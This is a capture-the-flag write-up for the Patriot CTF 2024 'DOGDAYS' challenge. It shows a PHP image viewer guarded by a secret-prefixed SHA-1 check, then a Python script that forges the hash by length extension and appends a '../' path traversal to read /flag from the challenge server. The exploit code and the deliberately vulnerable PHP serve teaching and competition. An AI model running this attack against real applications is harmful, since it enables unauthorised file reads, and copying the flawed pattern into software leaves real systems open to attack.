# DOGDAYS Patriot CTF 2024
@phulelouch
### Problem:
```
<?php
	$pic = $_GET['pic'];
	$hash = $_GET['hash'];
	if(sha1("TEST SECRET1".$pic)==$hash){
		$imgdata = base64_encode(file_get_contents("pupper/".str_replace("\0","",$pic)));
		echo "<!DOCTYPE html>";
		echo "<html><body><h1>Here's your picture:</h1>";
		echo "<img src='data:image/png;base64,".$imgdata."'>";
		echo "</body></html>";
	}else{
		echo "<!DOCTYPE html><html><body>";
		echo "<h1>Invalid hash provided!</h1>";
		echo '<img src="assets/BAD.gif"/>';
		echo "</body></html>";
	}
	// The flag is at /flag, that's all you're getting!
?>

```

### Way of thinking :
This is a sha1 length extension attack. I already know this vulnerability before so I realize it 

I won't try to explain it because LiveOverflow's video explain it better than anyone else. And the situation is the same as the video.
https://www.youtube.com/watch?v=6QQ4kgDWQ9w 

But in this case we just need to get to ../../../../../../../flag

###  Solution:

The code is in dogdays_exploit.py

![alt text](<Screenshot 2024-09-23 at 4.03.15 PM.png>)

### Reference:

https://github.com/nicolasff/pysha1
https://github.com/amlweems/hexpand

This code look cleaner than mine

```
import httpx
import HashTools
from os import urandom
import urllib.parse
import re
import base64

URL = "http://chal.competitivecyber.club:7777"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
        self.pic = ""
        self.hash = ""
    def triggerlfi(self):
        print(f'[x] pic : {self.pic}')
        print(f'[x] hash : {self.hash}')
        resp = self.c.get(f'{URL}/view.php?pic={self.pic}&hash={self.hash}')
        parsed = re.findall(r"base64,(.*)'>", resp.text)
        print(base64.b64decode(parsed[0]).decode())
        # print(f'{URL}/view.php?pic={self.pic}&hash={self.hash}') 
    
        
    def attackHash(self, payload: str):
        original_data = b"2.png"
        sig = "6e52c023e823622a86e124824efbce29d78b2e73"
        # attack
        append_data = payload.encode()
        magic = HashTools.new("sha1")
        new_data, new_sig = magic.extension(
            secret_length=12, original_data=original_data,
            append_data=append_data,
            signature=sig
        )
        new_data_hex = new_data.hex()
        self.pic = urllib.parse.quote(bytes.fromhex(new_data_hex))
        self.hash = new_sig
        
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    api.attackHash("../../../../../../flag")
    api.triggerlfi()
```